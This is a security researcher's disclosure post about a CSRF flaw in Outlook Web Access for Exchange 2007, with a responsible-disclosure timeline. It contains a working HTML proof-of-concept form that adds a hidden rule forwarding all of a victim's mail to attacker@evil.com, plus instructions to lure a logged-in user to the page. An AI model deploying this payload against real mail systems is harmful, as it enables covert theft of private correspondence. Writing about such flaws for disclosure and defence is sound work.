@@ -1,0 +1,43 @@
+Source:
+http://sites.google.com/site/tentacoloviola/pwning-corporate-webmails
+Demo:
+http://www.youtube.com/watch?v=Bx-zfu0uXYg
+
+After Nduja Connection worm and the Memova issue, it's now time to shed a light on vulnerabilities affecting corporate webmails. And when corporate webmails are concerned, a unique name springs to mind: Outlook Web Access.  No doubt that Microsoft OWA is the most adopted solution for accessing corporate web mail (wherever MS Exchange is the mail server) and is as well used in some consumer webmail applications (eg. Alice webmail from Telecom Italia).
+
+This time the threat comes from insufficient validation of HTTP requests sent to OWA by authenticated users...ehm..well, ok it's a CSRF vulnerability...
+As CSRF issues have been already deeply discussed in web security literature, I'll give no further explanations on this topic, so let's dive into the specific details of the OWA issue.
+ 
+Basicly OWA for Exchange 2007 implements no protection against CSRF: 
+* no REFERER check is performed
+* no CSRF nonce/token are managed for HTTP requests
+
+this means that ANY web page visited by an user within a valid OWA session can trigger valid requests towards OWA and completely pwn the victim's mail account.
+Among the nefarious effects of this attacks:
+
+1) set a filter (e.g. forward rule) for all incoming e-mails
+2) set remote wipe of the mobile device (e.g. iPhone) used to access mail account
+
+PoC:
+Here is the html snipplet that performs the POST request for setting the auto-forward rule:
+
+<form name="myform" method="post" enctype="text/plain" action=https://webmail.mycorporation.com/owa/ev.owa?oeh=1&ns=Rule&ev=Save> 
+<input type="hidden" name='<params><Id></Id><Name>Test</Name><RecpA4><item><Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"></Rcp></item></RecpA4><Actions><item><rca t="4"></rca></item></Actions></params>' value=""> 
+<!--The following line was added by hyperjacker (thank you) in order to make the processing of the form functional-->
+<input type="submit">
+
+</form>
+
+The code is quite straightforward, so you just need to put it on a web page, send the link to an OWA user, convince him to visit it and...he's pwned.
+Stupid simple.
+Interesting to notice here, this CSRF is performed through some kind of XML cross site POST; all the POST data are sent using the "name" parameter and leaving blank the "value".
+It seems that the server-side XML parser tolerate the trailing "=" character at the end of the POST.
+
+Timeline
+I'd like to point out that, due to the sensitive domain of this vulnerabilty, I've walked the road of responsable disclosure with Microsoft.
+I originally found the vulnerabilty on September 2009 and I immediately reported the issue to MS.
+After some discussions, MS decided to open a "case" to track this bug.
+In November 2009 the beta release of Exchange 2010 was distributed; giving a look at the OWA 2010 version I realized that in that version the vulnerability was solved.
+MS Security Response Center explained me that thanks to my disclosure, the CSRF issue was fixed "on the fly" in the Exchange 2010 beta release.
+For 2007 Exchange version, they decided to pack the fix within the Exchange 2007 Service Pack 3; sorry but 2003 release is no longer supported...
+As the SP3 is now out and available for download (even if MS did not even take care to inform me about this...) I'm free to publicly disclose the issue.
